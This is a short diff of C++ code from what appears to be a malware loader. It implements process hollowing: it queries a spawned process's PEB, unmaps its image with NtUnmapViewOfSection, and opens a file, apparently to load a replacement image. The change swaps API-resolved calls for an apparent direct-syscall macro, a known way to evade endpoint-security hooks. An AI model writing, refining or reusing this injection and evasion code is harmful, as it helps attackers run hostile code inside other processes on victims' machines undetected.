@@ -128,13 +128,13 @@ namespace core {
 		PVOID pbaddr = 0;
 		PROCESS_BASIC_INFORMATION pbi;
 
-		status = API(NTDLL, NtQueryInformationProcess)(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &len);
+		status = SYS(NtQueryInformationProcess)(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &len);
 
 		if (NT_SUCCESS(status)) {
 			PEB pebt;
 			if (API(KERNEL32, ReadProcessMemory)(pi.hProcess, (LPCVOID)((SIZE_T)pbi.PebBaseAddress + sizeof(size_t) * 2), &pebt, sizeof(PEB), 0)) {
 				pbaddr = pebt.Reserved3[1];
-				status = API(NTDLL, NtUnmapViewOfSection)(pi.hProcess, pbaddr);
+				status = SYS(NtUnmapViewOfSection)(pi.hProcess, pbaddr);
 
 				if (NT_SUCCESS(status)) {
 					HANDLE file = API(KERNEL32, CreateFileW)(name, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
